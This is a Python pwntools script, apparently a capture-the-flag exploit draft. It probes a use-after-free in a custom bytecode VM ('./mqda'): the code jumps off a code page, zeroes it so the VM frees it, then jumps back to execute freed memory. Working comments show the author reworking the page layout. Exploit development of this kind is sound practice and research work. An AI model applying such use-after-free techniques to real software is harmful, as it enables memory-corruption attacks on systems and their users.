#!/usr/bin/env python3
"""
UAF on code page:
1. Load code at 0x10000
2. Code zeros out itself (the code page at 0x10000)
3. Cleanup frees the code page
4. Next instruction fetch reads from freed memory!

But wait - if we zero our code, the instructions we need to execute are gone!
We need to jump to a DIFFERENT page before zeroing, then jump back.

Strategy:
- Code at 0x10000: jump to 0x20000
- Code at 0x20000: zero out 0x10000, then jump back to 0x10000
- After jump back, we execute freed memory!
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def jmp_reg(reg):
    # JMP reg: mode 0, opcode 14 (0x0E)
    return bytes([0x0E, reg])

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

# Load code at two addresses
code_addr1 = 0x10000  # Will be freed
code_addr2 = 0x11000  # Safe code

# Build code for page 1 (will be freed and reexecuted)
code1 = b''
code1 += mov_reg_imm(0, code_addr2)  # Target for jump
code1 += jmp_reg(0)                   # Jump to page 2

# The rest of page 1 will be zeros after we write code
# Pad to see what happens at specific offsets
# code1 is 8 bytes so far

# Build code for page 2 (zeros page 1, then jumps back)
code2 = b''

# Zero out page 1 (0x10000-0x100FF = 256 bytes of data)
for offset in range(4, 256, 4):  # Skip header, zero data
    vm_addr = 0x10000 + offset
    sp = (vm_addr >> 8) << 8 | (offset - 4)
    code2 += mov_reg_imm(15, sp)
    code2 += mov_reg_imm(0, 0)
    code2 += push_reg(0)

# Also need to zero bytes 0-3 of data (VM addr 0x10000-0x10003)
# These map to page[4-7]
# For VM addr 0x10000: need PUSH at SP where [(SP&0xFF)+4] = 4 => SP&0xFF = 0
# So SP = 0x10000
code2 += mov_reg_imm(15, 0x10000)
code2 += mov_reg_imm(0, 0)
code2 += push_reg(0)

# Page 1 is now all zeros -> cleanup should free it
# Jump back to page 1 and see what happens
code2 += mov_reg_imm(0, code_addr1)
code2 += jmp_reg(0)

# Combine: we'll load code starting at code_addr1
# Code1 at 0x10000, then Code2 at 0x11000
# We need to tell the loader about both

# Actually, the loader just loads one contiguous block starting at code_addr
# So let's load everything at 0x10000

full_code = code1.ljust(256, b'\x00')  # Page 1 code, padded to 256 bytes
full_code += code2                      # Page 2 code starts at offset 256 = VM addr 0x10100
full_code += hlt()                      # In case we fall through

# Wait, I need to reconsider. Let me make code2 start at a 256-byte boundary
# so it's in a separate page.

# Actually the VM uses 256-byte pages, so:
# 0x10000-0x100FF = page 0 data
# 0x10100-0x101FF = page 1 data
# etc.

# Let me adjust addresses
code_addr1 = 0x10000
code_addr2 = 0x10100  # Next page

code1 = b''
code1 += mov_reg_imm(0, code_addr2)
code1 += jmp_reg(0)

code2 = b''
# Zero page at 0x10000
for offset in range(0, 256, 4):
    vm_addr = 0x10000 + offset
    # PUSH writes at page[(SP&0xFF)+4]
    # For vm_addr, we want to write at page[offset+4] = data[offset]
    # (SP&0xFF)+4 = offset + 4 => SP&0xFF = offset
    # SP = (vm_addr >> 8) << 8 | offset, but vm_addr >> 8 = 0x100, so SP = 0x10000 | offset
    sp = 0x10000 | offset
    code2 += mov_reg_imm(15, sp)
    code2 += mov_reg_imm(0, 0)
    code2 += push_reg(0)

# After zeroing, cleanup frees page 0x10000
# Now jump back and execute from freed memory
code2 += mov_reg_imm(0, code_addr1)
code2 += jmp_reg(0)
code2 += hlt()

full_code = code1.ljust(256, b'\xff')  # Pad with 0xFF (ILLEGAL) for clarity
full_code += code2

print(f"[*] Code1 length: {len(code1)} bytes")
print(f"[*] Code2 length: {len(code2)} bytes") 
print(f"[*] Total code length: {len(full_code)} bytes")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr1).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(full_code)).encode())
p.recvuntil(b'Code> ')
p.send(full_code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr1).encode())

output = p.recvall(timeout=3)
print(f"Output: {output}")

if b'TERMINATED' in output:
    print("[*] HLT executed - code page might not have been freed")
elif b'ILLEGAL' in output:
    print("[+] ILLEGAL - executing freed/garbage memory!")
elif b'NORMAL' in output:
    print("[*] Normal exit - zeros executed as HLT (opcode 0)")
else:
    print(f"[?] Unexpected output")

p.close()
